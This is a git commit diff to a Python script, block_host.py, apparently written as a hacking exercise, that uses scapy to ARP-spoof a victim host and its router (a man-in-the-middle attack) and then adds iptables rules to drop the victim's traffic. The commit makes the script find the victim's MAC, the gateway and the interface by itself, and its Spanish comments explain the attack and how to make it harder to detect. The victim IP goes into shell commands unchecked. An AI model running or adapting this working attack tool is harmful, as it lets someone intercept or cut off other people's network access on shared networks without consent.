a7bc9fbb884433182bc17fe2941486001546692c
the-scripting-boy <hectorpadint00@gmail.com>
2021-06-15 17:14:13 +0200

    automatizando la obtención de macs e interfaz.

--- block_host.py
+++ block_host.py
@@ -8,7 +8,8 @@ import os
 import sys
 from time import sleep
 from scapy.all import ARP, send
-
+from netifaces import gateways, AF_INET
+from getmac import get_mac_address
 
 # constantes
 
@@ -20,15 +21,15 @@ BROADCAST = 'ff:ff:ff:ff:ff:ff'
 
 # funcion para realizar un ataque de Man In The Middle clásico (MITM)
 def _spoof(host, host_mac, gateway, gateway_mac, interface):
-	# enviaremos estos paquetes en intervalos de dos segundos para que funcione mejor, aunque en 
+	# enviaremos estos paquetes en intervalos de dos segundos para que funcione mejor, aunque en
 	# entoros reales no sería recomendable, puesto que generaríamos muchísimo tráfico ARP y sería
 	# facilísimo que nos detecten este ataque :p (subir tiempo de sleep para + discrección)
 	while True:
 		global stop_spoof
 		if (stop_spoof):
 			break
-		# enviamos un ARP 'hello' al router, diciéndole que la ip del host víctima está asociada a 
-		# nuestra mac, y a la víctima, diciéndole que ahora somos nosotros su gateway 
+		# enviamos un ARP 'hello' al router, diciéndole que la ip del host víctima está asociada a
+		# nuestra mac, y a la víctima, diciéndole que ahora somos nosotros su gateway
 		packets = [
 			ARP(op=2, psrc=host, pdst=gateway, hwdst=gateway_mac),
 			ARP(op=2, psrc=gateway, pdst=host, hwdst=host_mac)
@@ -51,33 +52,43 @@ def free(host, host_mac, gateway, gateway_mac, interface):
 
 # comenzamos el script
 
+if (os.getuid()!=0):
+	sys.exit("You must be root to run this script!!!")
+
 # parseamos argumentos
-if (len(sys.argv) == 6):
+if (len(sys.argv) == 2):
 	host = sys.argv[1]
-	host_mac = sys.argv[2]
-	gateway = sys.argv[3]
-	gateway_mac = sys.argv[4]
-	interface = sys.argv[5]
 else:
-    print("Usage: block_host <host_ip> <host_mac> <gateway> <gateway_mac> <interface>")
+    print("Usage: block_host <host_ip>")
     sys.exit()
+
+# obtenemos la ip y mac del router, la mac de la víctima y la interfaz
+try:
+	host_mac = get_mac_address(ip=host, network_request=True)
+	tuple = gateways()['default'][AF_INET]
+	gateway = tuple[0]
+	interface = tuple[1]
+	gateway_mac = get_mac_address(ip=gateway, network_request=True)
+except Exception as e:
+	print("Exception occured network information.")
+	print(e)
 
 try:
 	stop_spoof = False
-	# lanzamos un thread que haga el envenenamiento de las tablas ARP del router y la víctima 
+	# lanzamos un thread que haga el envenenamiento de las tablas ARP del router y la víctima
 	thread = threading.Thread(target=_spoof, args=[host, host_mac, gateway, gateway_mac, interface], daemon=True)
 	thread.start()
 	# esperamos un poco, algunos dispositivos viejos pueden tardar bastante en actualizar sus tablas ARP
 	sleep(5)
 	# una vez hecho el MITM, el único punto de acceso a internet que tendrá la víctima será a través de nosotros, por lo tanto,
 	# le estamos haciendo de router
-	# para bloquear su acceso a internet sería tan fácil como prohibir que desde esa ip se forwardee nada haciendo uso de un 
+	# para bloquear su acceso a internet sería tan fácil como prohibir que desde esa ip se forwardee nada haciendo uso de un
 	# firewall como iptables
 	subprocess.call('sudo iptables -t filter -A FORWARD -s {} -j DROP'.format(host), shell=True, stdout=DEVNULL, stderr=DEVNULL)
 	subprocess.call('sudo iptables -t filter -A FORWARD -d {} -j DROP'.format(host), shell=True, stdout=DEVNULL, stderr=DEVNULL)
 	print("blocked host with ip:"+host+".")
 	while True:
-		# si queremos volver a dejar a la víctima conectarse a internet presionamos 'q' 
+		# si queremos volver a dejar a la víctima conectarse a internet presionamos 'q'
 		print("Press q to free the blocked host:")
 		x = input()
 		if (x=="q" or x=="Q"):
@@ -92,5 +103,3 @@ except KeyboardInterrupt:
 	stop_spoof = True
 	thread.join()
 	free(host, host_mac, gateway, gateway_mac, interface)
-		
-	
